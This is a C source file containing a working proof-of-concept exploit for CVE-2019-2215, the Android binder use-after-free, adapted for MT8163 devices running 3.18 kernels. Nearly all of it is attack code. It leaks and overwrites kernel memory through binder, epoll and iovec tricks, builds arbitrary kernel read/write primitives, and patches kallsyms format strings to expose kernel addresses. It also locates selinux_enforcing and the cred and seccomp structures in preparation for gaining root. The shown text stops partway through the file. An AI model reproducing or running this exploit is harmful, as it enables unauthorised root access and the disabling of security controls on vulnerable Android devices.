/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 * Some stuff from Grant Hernandez to achieve root (Oct 15th 2019)
 * Modified by Alexander R. Pruss for 3.18 kernels where WAITQUEUE_OFFSET is 0x98
 *
 * Modified by Roger Ortiz for MT8163 3.18.X (64-bit) devices.
*/

#define DELAY_USEC 200000

#define KERNEL_BASE search_base
#define OFFSET__thread_info__flags 0x000
#define OFFSET__task_struct__stack 0x008
#define OFFSET__cred__uid 0x004
#define OFFSET__cred__securebits 0x024
#define OFFSET__cred__cap_permitted 0x030
#define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
#define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)

#define USER_DS 0x8000000000ul
#define BINDER_SET_MAX_THREADS 0x40046205ul
#define MAX_THREADS 3

#define RETRIES 3

#define PROC_KALLSYMS
#define KALLSYMS_CACHING
#define KSYM_NAME_LEN 128

#define OFFSET__cred__security 0x078
#define OFFSET__cred__cap_inheritable 0x028
#define OFFSET__cred__cap_ambient 0x048

#define _GNU_SOURCE
#include <libgen.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <sys/types.h>

#define MAX_PACKAGE_NAME 1024

#define MIN(x, y) ((x) < (y) ? (x) : (y))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

#define BINDER_THREAD_EXIT 0x40046208ul
#define BINDER_THREAD_SZ 0x198
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET (0xA8)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
#define UAF_SPINLOCK 0x10001
#define PAGE 0x1000ul
#define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8
typedef uint8_t u8;
typedef uint32_t u32;
typedef uint64_t u64;
int quiet = 0;

const char whitelist[] = "su98-whitelist.txt";
const char denyfile[] = "su98-denied.txt";
int have_kallsyms = 0;
int kernel3 = 1;
int have_base=0;
int good_base=0;
int oldpid;
unsigned long pid_addr;
char* myPath;
char* myName;
unsigned long search_base=0xffffffc000000000ul;
unsigned long skip1=0;
unsigned long skip2=0;
unsigned long skip_base=0;

void con_loop(void);
int con_consume(char **token);
int con_parse_hexstring(char *token, u64 *val);
int con_parse_number(char *token, u64 *val);
int con_parse_hexbytes(char **token, u8 **data, size_t *len);
void con_kdump(u64 kaddr, size_t len);

int kptrInit=0;
struct kallsyms {
    unsigned long addresses;
    unsigned long names;
    unsigned long num_syms;
    unsigned long token_table;
    unsigned long markers;
    char* token_table_data;
    unsigned short token_index_data[256];
} kallsyms;

void doLog(int verbosity, int caller, char *fmt, ...) {
    va_list ap;
    char date[100];
    char msg[1024];
    char log_buf[2048]; // Avoid buffer overflows.

    // Default to INFO and MAIN.
    char *verb = "[INFO] ";
    char *call = "[MAIN] ";

    // Make sure we're not running under 'quiet' mode.
    if (quiet) return;

    // Parse the log message.
    va_start(ap, fmt);
    vsnprintf(msg, sizeof(msg), fmt, ap);
    va_end(ap);

    // Get the current time and convert it to a 'pretty' format.
    time_t t = time(NULL);
    strftime(date, 100, "[%T]: ", localtime(&t));

    //
    // Verbosity can be either 1 (INFO), 2 (WARNING) or 3 (ERROR).
    // The caller can be either 1 (MAIN), 2 (PARENT) or 3 (CHILD).
    //
    if (verbosity == 1)
        verb = "[INFO] ";
    else if (verbosity == 2)
        verb = "[WARN] ";
    else if (verbosity == 3)
        verb = "[ERROR] ";
    if (caller == 1)
        call = "[MAIN] ";
    else if (caller == 2)
        call = "[PARENT] ";
    else if (caller == 3)
        call = "[CHILD] ";

    // We've got the date, the verbosity, the caller and the message.
    // Join them as per the following format: '[DATE]: [VERBOSITY] [CALLER] MESSAGE'.
    sprintf(log_buf, "%s%s%s%s\n", date, verb, call, msg);

    // Print the result.
    printf("%s", log_buf);

#ifdef LOG_FILE
    // If the log file is available, write the log to it.
    FILE *log = fopen(LOG_FILE, "a");
    if (log != NULL) {
        fprintf(log, "%s", log_buf);
        fclose(log);
    }
#endif

    // Flush the buffer.
    fflush(stdout);
}

int isKernelPointer(unsigned long p) {
    return p >= KERNEL_BASE && p<=0xFFFFFFFFFFFFFFFEul;
}

unsigned long kernel_read_ulong(unsigned long kaddr);

// File descriptors follow.
int epfd; // epoll fd
int binder_fd; // binder fd

unsigned long iovec_size(struct iovec *iov, int n)
{
    unsigned long sum = 0;
    for (int i = 0; i < n; i++)
        sum += iov[i].iov_len;
    return sum;
}

unsigned long iovec_max_size(struct iovec *iov, int n)
{
    unsigned long m = 0;
    for (int i = 0; i < n; i++)
    {
        if (iov[i].iov_len > m)
            m = iov[i].iov_len;
    }
    return m;
}

int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
{
    int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
    char *dummyBuffer = malloc(dummyBufferSize);
    if (dummyBuffer == NULL)
        doLog(3, 2, "allocating dummyBuffer");

    memset(dummyBuffer, 0, dummyBufferSize);

    doLog(1, 2, "clobbering at 0x%lx", payloadAddress);

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        doLog(3, 2, "epoll_add");

    unsigned long testDatum = 0;
    unsigned long const testValue = 0xABCDDEADBEEF1234ul;

    struct iovec iovec_array[IOVEC_ARRAY_SZ];
    memset(iovec_array, 0, sizeof(iovec_array));

    const unsigned SECOND_WRITE_CHUNK_IOVEC_ITEMS = 3;

    unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS * 2] = {
            (unsigned long)dummyBuffer,
            SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10,
            payloadAddress,
            payloadLength,
            (unsigned long)&testDatum,
            sizeof(testDatum),
    };

    int delta = (UAF_SPINLOCK + sizeof(second_write_chunk)) % PAGE;
    int paddingSize = delta == 0 ? 0 : PAGE - delta;

    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                              // spinlock: will turn to UAF_SPINLOCK
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = second_write_chunk;        // wq->task_list->next: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = dummyBuffer;               // stuff from this point will be overwritten and/or ignored
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_len = payloadLength;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_len = sizeof(testDatum);
    int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);

    int pipes[2];
    pipe(pipes);
    if ((fcntl(pipes[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        doLog(3, 2, "pipe size");
    if ((fcntl(pipes[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        doLog(3, 2, "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        doLog(3, 2, "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        doLog(1, 3, "Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        doLog(1, 3, "Done EPOLL_CTL_DEL.");

        char *f = malloc(totalLength);
        if (f == NULL)
            doLog(3, 3, "Allocating memory");
        memset(f, 0, paddingSize + UAF_SPINLOCK);
        unsigned long pos = paddingSize + UAF_SPINLOCK;
        memcpy(f + pos, second_write_chunk, sizeof(second_write_chunk));
        pos += sizeof(second_write_chunk);
        memcpy(f + pos, src, payloadLength);
        pos += payloadLength;
        memcpy(f + pos, &testValue, sizeof(testDatum));
        pos += sizeof(testDatum);
        write(pipes[1], f, pos);
        doLog(1, 3, "CHILD: wrote %lu", pos);
        close(pipes[1]);
        close(pipes[0]);
        exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    int b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ);

    doLog(1, 2, "readv returns %d, expected %d", b, totalLength);

    if (testDatum != testValue)
        doLog(3, 2, "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
    else
        doLog(1, 2, "clobber value matches: is %lx", testDatum);

    free(dummyBuffer);
    close(pipes[0]);
    close(pipes[1]);

    return testDatum == testValue;
}

int leak_data(void *leakBuffer, int leakAmount,
              unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
              unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p)
{
    unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
    unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough

    int success = 1;

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        doLog(3, 2, "epoll_ctl");

    struct iovec iovec_array[IOVEC_ARRAY_SZ];

    memset(iovec_array, 0, sizeof(iovec_array));

    int delta = (UAF_SPINLOCK + minimumLeak) % PAGE;
    int paddingSize = (delta == 0 ? 0 : PAGE - delta) + PAGE;

    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                                /* spinlock: will turn to UAF_SPINLOCK */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (unsigned long *)0xDEADBEEF; /* wq->task_list->next */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = adjLeakAmount;                /* wq->task_list->prev */
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long *)0xDEADBEEF; /* we shouldn't get to here */
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = extraLeakAmount + UAF_SPINLOCK + 8;

    unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned char *dataBuffer = malloc(maxLength);

    if (dataBuffer == NULL)
        doLog(3, 2, "Allocating %lu bytes", maxLength);

    for (int i = 0; i < IOVEC_ARRAY_SZ; i++)
        if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
            iovec_array[i].iov_base = dataBuffer;

    int b;
    int pipefd[2];
    int leakPipe[2];
    if (pipe(pipefd))
        doLog(3, 2, "pipe");
    if (pipe(leakPipe))
        err(2, "pipe");
    if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        doLog(3, 2, "pipe size");
    if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        doLog(3, 2, "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        doLog(3, 2, "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        char childSuccess = 1;

        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        doLog(1, 3, "Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        doLog(1, 3, "Done EPOLL_CTL_DEL.");

        unsigned long size1 = paddingSize + UAF_SPINLOCK + minimumLeak;
        doLog(1, 3, "initial portion length 0x%lx", size1);
        char buffer[size1];
        memset(buffer, 0, size1);
        if (read(pipefd[0], buffer, size1) != size1)
            doLog(3, 3, "reading first part of pipe");

        memcpy(dataBuffer, buffer + size1 - minimumLeak, minimumLeak);

        int badPointer = 0;
        if (memcmp(dataBuffer, dataBuffer + 8, 8))
            badPointer = 1;
        unsigned long addr = 0;
        memcpy(&addr, dataBuffer, 8);

        if (!isKernelPointer(addr)) {
            badPointer = 1;
            childSuccess = 0;
        }

        unsigned long task_struct_ptr = 0;

        memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
        doLog(1, 3, "task_struct_ptr = 0x%lx", task_struct_ptr);

        if (!badPointer && (extraLeakAmount > 0 || task_struct_plus_8_p != NULL))
        {
            unsigned long extra[6] = {
                    addr,
                    adjLeakAmount,
                    extraLeakAddress,
                    extraLeakAmount,
                    task_struct_ptr + 8,
                    8};
            doLog(1, 3, "clobbering with extra leak structures");
            if (clobber_data(addr, &extra, sizeof(extra)))
                doLog(1, 3, "clobbering worked");
            else {
                doLog(3, 3, "clobbering failed");
                childSuccess = 0;
            }
        }

        errno = 0;
        if (read(pipefd[0], dataBuffer + minimumLeak, adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
            doLog(3, 3, "leak failed");

        write(leakPipe[1], dataBuffer, adjLeakAmount);

        if (extraLeakAmount > 0)
        {
            doLog(1, 3, "Leaking extra data...");
            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) {
                childSuccess = 0;
                doLog(3, 3, "Unable to read extra leak data");
            }
            write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
        }
        if (task_struct_plus_8_p != NULL)
        {
            if (read(pipefd[0], dataBuffer, 8) != 8) {
                childSuccess = 0;
                doLog(3, 3, "Unable to leak second field of task_struct");
            }
            doLog(1, 3, "task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
            write(leakPipe[1], dataBuffer, 8);
        }
        write(leakPipe[1], &childSuccess, 1);

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakPipe[0]);
        close(leakPipe[1]);
        doLog(1, 3, "Finished write to FIFO!");

        if (badPointer) {
            errno = 0;
            doLog(3, 3, "Problematic address pointer, e.g., %lx", addr);
        }
        exit(0);
    }

    doLog(1, 2, "Soon will be calling WRITEV");
    errno = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
    doLog(1, 2, "writev() returns 0x%x", (unsigned int)b);
    if (b != totalLength) {
        doLog(3, 2, "writev() returned wrong value: needed 0x%lx", totalLength);
        success = 0;
        goto DONE;
    }

    doLog(1, 2, "Reading leaked data...");

    b = read(leakPipe[0], dataBuffer, adjLeakAmount);
    if (b != adjLeakAmount) {
        doLog(2, 2, "read(0x%x) != 0x%lx", b, adjLeakAmount);
        success = 0;
        goto DONE;
    }

    if (leakAmount > 0)
        memcpy(leakBuffer, dataBuffer, leakAmount);

    if (extraLeakAmount != 0)
    {
        doLog(1, 2, "Reading extra leaked data");
        b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
        if (b != extraLeakAmount) {
            doLog(2, 2, "read(0x%x) != 0x%lx", b, extraLeakAmount);
            success = 0;
            goto DONE;
        }
    }

    if (task_struct_plus_8_p != NULL)
    {
        if (read(leakPipe[0], task_struct_plus_8_p, 8) != 8) {
            doLog(3, 2, "Unable to read leaked task_struct at offset 8!");
            success = 0;
            goto DONE;
        }
    }

    char childSucceeded=0;

    read(leakPipe[0], &childSucceeded, 1);
    if (!childSucceeded)
        success = 0;

    if (task_struct_ptr_p != NULL)
        memcpy(task_struct_ptr_p, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);

DONE:
    close(pipefd[0]);
    close(pipefd[1]);
    close(leakPipe[0]);
    close(leakPipe[1]);

    int status;
    wait(&status);
    free(dataBuffer);

    if (success)
        doLog(1, 2, "Leaking successful!");

    return success;
}

int leak_data_retry(void *leakBuffer, int leakAmount,
                    unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
                    unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p) {
    int try = 0;
    while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, task_struct_plus_8_p)) {
        doLog(3, 1, "%s: leak failed, retrying!", __func__);
        try++;
    }
    if (0 < try && try < RETRIES)
        doLog(1, 1, "%s: it took %d tries, but succeeded!", __func__, try);
    return try < RETRIES;
}

int clobber_data_retry(unsigned long payloadAddress, const void *src, unsigned long payloadLength) {
    int try = 0;
    while (try < RETRIES && !clobber_data(payloadAddress, src, payloadLength)) {
        doLog(3, 1, "%s: clobber_data failed, retrying!", __func__);
        try++;
    }
    if (0 < try && try < RETRIES)
        doLog(1, 1, "%s: it took %d tries, but succeeded!", __func__, try);
    return try < RETRIES;
}

int kernel_rw_pipe[2];
struct kernel_buffer {
    unsigned char pageBuffer[PAGE];
    unsigned long pageBufferOffset;
} kernel_buffer = { .pageBufferOffset = 0 };

void reset_kernel_pipes() {
    kernel_buffer.pageBufferOffset = 0;
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    if (pipe(kernel_rw_pipe))
        doLog(1, 3, "kernel_rw_pipe failed");
}

int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
    if (len > PAGE)
        doLog(1, 3, "%s: kernel writes over PAGE_SIZE are messy, tried 0x%lx!", __func__, len);
    if (write(kernel_rw_pipe[1], buf, len) != len ||
        read(kernel_rw_pipe[0], (void *)kaddr, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
    if (len != raw_kernel_write(kaddr, buf, len))
        doLog(1, 3, "%s: error with kernel writing!", __func__);
}

int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
    if (len > PAGE)
        doLog(1, 3, "%s: kernel writes over PAGE_SIZE are messy, tried 0x%lx!", __func__, len);
    if (write(kernel_rw_pipe[1], (void *)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
    if (len > PAGE)
        doLog(1, 3, "%s: kernel reads over PAGE_SIZE are messy, tried 0x%lx!", __func__, len);
    if (len != raw_kernel_read(kaddr, buf, len))
        doLog(1, 3, "%s: error with kernel reading!", __func__);
}

unsigned char kernel_read_uchar(unsigned long offset) {
    if (kernel_buffer.pageBufferOffset == 0 || offset < kernel_buffer.pageBufferOffset || kernel_buffer.pageBufferOffset+PAGE <= offset) {
        kernel_buffer.pageBufferOffset = offset & ~(PAGE-1);
        kernel_read(kernel_buffer.pageBufferOffset, kernel_buffer.pageBuffer, PAGE);
    }
    return kernel_buffer.pageBuffer[offset-kernel_buffer.pageBufferOffset];
}

unsigned long kernel_read_ulong(unsigned long kaddr) {
    unsigned long data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}

unsigned long kernel_read_uint(unsigned long kaddr) {
    unsigned int data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}

void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
    kernel_write(kaddr, &data, sizeof(data));
}

void kernel_write_uint(unsigned long kaddr, unsigned int data) {
    kernel_write(kaddr, &data, sizeof(data));
}

void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
    kernel_write(kaddr, &data, sizeof(data));
}

// Find selinux_enforcing address from avc_denied address
// Special thanks to DrZener for the code.
unsigned long findSelinuxEnforcingFromAvcDenied(unsigned long avc_denied_address)
{
    unsigned long address;
    unsigned long selinux_enforcing_address;
    bool adrp_found = 0;
    for(address = avc_denied_address; address <= avc_denied_address + 0x60; address += 4)
    {
        unsigned int instruction = kernel_read_uint(address);

        if(!adrp_found)
        {
            unsigned int instruction_masked = instruction;
            instruction_masked >>= 24;
            instruction_masked &= 0x9F;
            if((instruction_masked ^ 0x90) == 0 )
            {
                selinux_enforcing_address = address;
                unsigned int imm_hi, imm_lo, imm;
                imm_hi = (instruction >> 5) &  0x7FFFF;
                imm_lo = (instruction >> 29) & 3;
                imm = ((imm_hi << 2) | imm_lo) << 12;
                selinux_enforcing_address &= 0xFFFFFFFFFFFFF000;
                selinux_enforcing_address += imm;
                adrp_found = 1;
            }
        }
        if (adrp_found)
        {
            unsigned int instruction_masked = instruction;
            instruction_masked >>= 22;
            instruction_masked &= 0x2FF;
            if((instruction_masked ^ 0x2E5) == 0 )
            {
                unsigned int offset = ((instruction >> 10) & 0xFFF) << 2;
                selinux_enforcing_address += offset;
                return selinux_enforcing_address;
            }
        }
    }
    doLog(1, 3, "Unable to find selinux_enforcing address from avc_denied address!");
    return 0UL;
}

// Make the kallsyms module not check for permission to list symbol addresses
int fixKallsymsFormatStrings(unsigned long start)
{
    errno = 0;

    int found = 0;

    start &= ~(PAGE - 1);

    unsigned long searchTarget;

    memcpy(&searchTarget, "%pK %c %", 8);

    int backwards = 1;
    int forwards = 1;
    int direction = 1;
    unsigned long forwardAddress = start;
    unsigned long backwardAddress = start - PAGE;
    unsigned long page[PAGE / 8];

    doLog(1, 1, "Searching for kallsyms format strings...");
    while ((backwards || forwards) && found < 2)
    {
        unsigned long address = direction > 0 ? forwardAddress : backwardAddress;

        if (raw_kernel_read(address, page, PAGE) != PAGE)
        {
            if (direction > 0)
                forwards = 0;
            else
                backwards = 0;
        }
        else
        {
            for (int i = 0; i < PAGE / 8; i++)
                if (page[i] == searchTarget)
                {
                    doLog(1, 1, "Maybe matched format string! %lu", page[i]);
                    unsigned long a = address + 8 * i;

                    char fmt[16];

                    kernel_read(a, fmt, 16);

                    if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A"))
                    {
                        doLog(1, 1, "Patching longer version at %lx", a);
                        if (15 != raw_kernel_write(a, "%p %c %s\t[%s]\x0A", 15)) {
                            doLog(3, 1, "Unable to patch longer version at %lx, you probably have read-only const storage!", a);
                            return found;
                        }
                        found++;
                    }
                    else if (!strcmp(fmt, "%pK %c %s\x0A"))
                    {
                        doLog(1, 1, "Patching shorter version at %lx", a);
                        if (15 != raw_kernel_write(a, "%p %c %s\x0A", 10)) {
                            doLog(3, 1, "Unable to patch shorter version at %lx, you probably have read-only const storage!", a);
                            return found;
                        }
                        found++;
                    }

                    if (found >= 2)
                        return 2;
                }
        }

        if (direction > 0)
            forwardAddress += PAGE;
        else
            backwardAddress -= PAGE;

        direction = -direction;

        if (direction < 0 && !backwards)
        {
            direction = 1;
        }
        else if (direction > 0 && !forwards)
        {
            direction = -1;
        }
    }

    doLog(1, 1, "KASLR: found and replaced %d format strings", found);

    return found;
}

int verifyCred(unsigned long cred_ptr) {
    unsigned uid;
    if (cred_ptr < 0xffffff0000000000ul || 4 != raw_kernel_read(cred_ptr+OFFSET__cred__uid, &uid, 4))
        return 0;
    return uid == getuid();
}

int getCredOffset(unsigned char* task_struct_data) {
    char taskname[16];
    unsigned n = MIN(strlen(myName)+1, 16);
    memcpy(taskname, myName, n);
    taskname[15] = 0;

    for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) {
        if (0 == memcmp(task_struct_data+i, taskname, n) && verifyCred(*(unsigned long*)(task_struct_data+i-8)))
            return i-8;
    }

    errno = 0;
    doLog(1, 3, "Cannot find cred structure");
    return -1;
}

int getSeccompOffset(unsigned char* task_struct_data, unsigned credOffset, unsigned seccompStatus) {
    if (seccompStatus != 2)
        return -1;

    unsigned long firstGuess = -1;

    for (int i=credOffset&~7; i<PAGE-24; i+=8) {
        struct {
            unsigned long seccomp_status;
            unsigned long seccomp_filter;
            unsigned int parent_exe;
            unsigned int child_exe;
        } *p = (void*)(task_struct_data+i);

        if (p->seccomp_status == seccompStatus && isKernelPointer(p->seccomp_filter)) {
            if (p->child_exe == p->parent_exe + 1) {
                return i;
            }
            else {
                if (firstGuess < 0)
                    firstGuess = i;
            }
        }
    }

    return firstGuess;
}

unsigned long countIncreasingEntries(unsigned long start) {
    unsigned long count = 1;
    unsigned long prev = kernel_read_ulong(start);
    do {
        start+=8;
        if(start==skip1&&kptrInit==1){
            start=skip2;
            count+=31;
            continue;
        }
        unsigned long v = kernel_read_ulong(start);
        if (v < prev)
            return count;
        count++;
    } while(1);
}

int increasing(unsigned long* location, unsigned n) {
    for (int i=0; i<n-1; i++)
        if (location[i] > location[i+1])
            return 0;
    return 1;
}

int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd, unsigned long* startP, unsigned long* countP) {
    if (searchStart == 0)
        searchStart = KERNEL_BASE;
    if (searchEnd == 0)
        searchEnd = searchStart + 0x5000000;
    unsigned char page[PAGE];
    for (unsigned long i=searchStart; i<searchEnd ; i+=PAGE) {
        if (PAGE == raw_kernel_read(i, page, PAGE))
            for (int j=0; j<PAGE; j+=0x100) {
                if (isKernelPointer(*(unsigned long*)(page+j)) && increasing((unsigned long*)(page+j), 256/8-1)) {
                    unsigned long count = countIncreasingEntries(i+j);
                    if (count >= 40000) {
                        *startP = i+j;
                        *countP = count;
                        return 1;
                    }
                }
            }
    }
    return 0;
}

int get_kallsyms_name(unsigned long offset, char* name) {
    unsigned char length = kernel_read_uchar(offset++);

    for (unsigned char i = 0; i < length ; i++) {
        int index = kallsyms.token_index_data[kernel_read_uchar(offset++)];
        int n = strlen(kallsyms.token_table_data+index);
        memcpy(name, kallsyms.token_table_data+index, n);
        name += n;
    }
    *name = 0;

    return 1+length;
}

int loadKallsyms() {
    if (have_kallsyms)

        return 1;
    if (!find_kallsyms_addresses(0, 0, &kallsyms.addresses, &kallsyms.num_syms))
        return 0;

    doLog(1, 1, "kallsyms addresses start at 0x%lx and have %ld entries", kallsyms.addresses, kallsyms.num_syms);
    unsigned long offset = kallsyms.addresses + 8 * kallsyms.num_syms;

    doLog(1, 1, "kallsyms names end at 0x%lx", offset);
    unsigned long ost=offset;
    offset = (offset + 0xFFul) & ~0xFFul;

    unsigned long count = kernel_read_ulong(offset);
    offset += 8;

    if (count != kallsyms.num_syms) {
        doLog(3, 1, "inconistency in kallsyms table.");
        if (count - 20 > kallsyms.num_syms || count > kallsyms.num_syms) {
            doLog(3, 1, "kallsyms entry count mismatch %ld", count);
            have_base=1;
            if(kallsyms.num_syms<60000){skip1=ost;skip_base=search_base;}
            if(kallsyms.num_syms>70000)skip2=kallsyms.addresses;
            return 0;
        }
        kallsyms.num_syms = count;

        // Strip start of table to the location suggested by count. This should work if we got the offset correct, i.e we found
        // the end of the table correctly but the start was too early. If we missed 'some of' the start, we MUST have got it wrong
        // because there wasn't an increasing sequence, so we bail out in the if block above.
        kallsyms.addresses = offset - 8 * kallsyms.num_syms;
    }

    offset = (offset + 0xFFul) & ~0xFFul;
    kallsyms.names = offset;

    for (unsigned long i = 0 ; i < kallsyms.num_syms ; i++) {
        unsigned char len = kernel_read_uchar(offset++);
        offset += len;
    }

    offset = (offset + 0xFF) & ~0xFFul;
    kallsyms.markers = offset;

    offset += 8 * ((kallsyms.num_syms + 255ul) / 256ul);
    offset = (offset + 0xFF) & ~0xFFul;
    kallsyms.token_table = offset;

    int tokens = 0;
    while (tokens < 256) {
        if (kernel_read_uchar(offset++) == 0)
            tokens++;
    }

    unsigned long token_table_length = offset - kallsyms.token_table;

    kallsyms.token_table_data = malloc(token_table_length);

    errno = 0;
    if (kallsyms.token_table_data == NULL)
        doLog(3, 1, "Unable to allocate memory for the token table!");

    for (unsigned long i = 0 ; i < token_table_length ; i++)
        kallsyms.token_table_data[i] = kernel_read_uchar(kallsyms.token_table + i);

    offset = (offset + 0xFF) & ~0xFFul;

    kernel_read(offset, kallsyms.token_index_data, sizeof(kallsyms.token_index_data));

    have_kallsyms = 1;
    good_base = 1;
    return 1;
}

unsigned long findSymbol_memory_search(char* symbol) {
    if (!loadKallsyms()) {
        doLog(3, 1, "Unable to load kallsyms table!");
        return 0;
    }

    unsigned long offset = kallsyms.names;
    char name[KSYM_NAME_LEN];
    unsigned n = strlen(symbol);

    for(unsigned long i = 0; i < kallsyms.num_syms; i++) {
        unsigned int n1 = get_kallsyms_name(offset, name);
        if (!strncmp(name+1, symbol, n) && (name[1+n] == '.' || !name[1+n])) {
            unsigned long address = kernel_read_ulong(kallsyms.addresses + i*8);
            doLog(1, 1, "Found %s in kernel memory at %lx!", symbol, address);
            return address;
        }
        offset += n1;
    }

    return 0;
}

char* allocateSymbolCachePathName(char* symbol) {
    int n = strlen(myPath);

    char* pathname = malloc(strlen(symbol)+7+1+n);
    if (pathname == NULL) {
        errno = 0;
        doLog(3, 1, "Unable to allocate memory for the pathname!");
    }
    strcpy(pathname, myPath);
    strcat(pathname, symbol);
    strcat(pathname, ".symbol");

    return pathname;
}

